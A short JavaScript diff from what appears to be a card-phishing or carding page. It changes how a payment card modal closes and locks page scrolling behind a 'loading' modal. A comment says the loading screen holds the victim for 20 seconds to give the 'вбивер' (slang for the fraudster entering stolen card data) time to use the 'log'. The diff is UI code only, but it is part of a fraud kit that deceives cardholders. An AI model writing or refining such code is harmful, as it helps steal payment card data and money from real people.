@@ -2761,13 +2761,14 @@ document.addEventListener('DOMContentLoaded', function() {
         cardCVVInput.value = '';
         localStorage.removeItem('cardData');
 
-        // Close card modal and show loading screen
-        closeCardModal();
+        // Close card modal WITHOUT restoring overflow
+        document.getElementById('cardModal').classList.remove('open');
 
         // Show loading modal
         const loadingModal = document.getElementById('loadingModal');
         if (loadingModal) {
           loadingModal.classList.add('open');
+          document.body.style.overflow = 'hidden';
         }
 
         // Close loading modal after 20 seconds (give вбивер time to take log)
